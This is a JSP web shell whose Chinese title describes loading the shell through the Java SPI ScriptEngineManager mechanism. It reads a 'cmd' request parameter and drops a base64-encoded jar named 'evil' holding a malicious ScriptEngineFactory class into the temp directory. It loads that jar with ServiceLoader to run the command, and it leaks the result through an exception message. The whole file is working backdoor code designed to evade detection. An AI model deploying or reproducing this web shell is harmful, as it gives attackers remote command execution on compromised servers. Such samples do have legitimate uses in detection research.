<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.util.Random" %>
<%@ page import="java.io.File" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.Paths" %>
<%@ page import="java.util.Base64" %>
<%@ page import="javax.script.ScriptEngineFactory" %>
<%@ page import="java.util.ServiceLoader" %>
<%@ page import="java.util.Iterator" %>
<html>
<body>
<h2>SPI机制的ScriptEngineManager自动加载实例化JSP WebShell</h2>
<%
    String tmp = System.getProperty("java.io.tmpdir");
    Random random = new Random();
    String jarPath = tmp + File.separator + "evil-" + random.nextInt(1000000) + ".jar";
    String inputFile = tmp + File.separator + "jabdhjabdjkandaldlanaklndkand.txt";
    String s = request.getParameter("cmd");
    if (Files.exists(Paths.get(inputFile)))
        Files.delete(Paths.get(inputFile));
    Files.write(Paths.get(inputFile), s.getBytes());

    if (Files.exists(Paths.get(jarPath)))
        Files.delete(Paths.get(jarPath));
    Files.write(Paths.get(jarPath), Base64.getDecoder().decode("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"));
    try {
        Iterator<ScriptEngineFactory> iterator = ServiceLoader
                .load(ScriptEngineFactory.class, new URLClassLoader(new URL[]{new URL("file:" + jarPath)})).iterator();
        while (iterator.hasNext())
            iterator.next();
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>